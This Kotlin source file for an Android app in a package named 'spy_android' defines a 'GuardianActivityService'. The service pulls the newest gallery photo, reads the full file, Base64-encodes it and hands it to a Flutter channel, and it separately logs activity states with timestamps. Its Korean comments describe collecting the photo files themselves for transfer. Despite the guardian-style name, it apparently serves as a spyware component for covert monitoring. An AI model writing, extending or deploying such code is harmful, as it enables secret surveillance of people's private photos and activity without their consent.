package com.example.spy_android

import android.content.Context
import android.provider.MediaStore
import android.util.Log
import android.util.Base64
import io.flutter.plugin.common.MethodChannel
import java.io.File

class GuardianActivityService(private val context: Context, private val channel: MethodChannel?) {

    companion object {
        private const val TAG = "GuardianActivity"
    }

    // 갤러리 최신 사진 파일 자체를 수집 (Base64 인코딩하여 전달)
    fun scanLatestMedia() {
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATA
        )
        
        val sortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        
        val query = context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            sortOrder
        )

        query?.use { cursor ->
            if (cursor.moveToFirst()) {
                val path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                val name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                
                try {
                    val file = File(path)
                    if (file.exists()) {
                        val bytes = file.readBytes()
                        // 파일 전송을 위해 Base64 인코딩 (이미지 데이터는 인코딩 필수)
                        val base64Image = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        
                        val payload = mapOf(
                            "name" to name,
                            "image_data" to base64Image,
                            "type" to "image/jpeg"
                        )

                        channel?.invokeMethod("onMediaCaptured", payload)
                        Log.d(TAG, "Media file captured: $name")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error reading media file $name: ${e.message}")
                }
            }
        }
    }

    fun checkActivityState(state: String) {
        val payload = mapOf(
            "timestamp" to System.currentTimeMillis().toString(),
            "activity" to state
        )
        channel?.invokeMethod("onActivityStateCaptured", payload)
        Log.d(TAG, "Activity state captured: $state")
    }
}
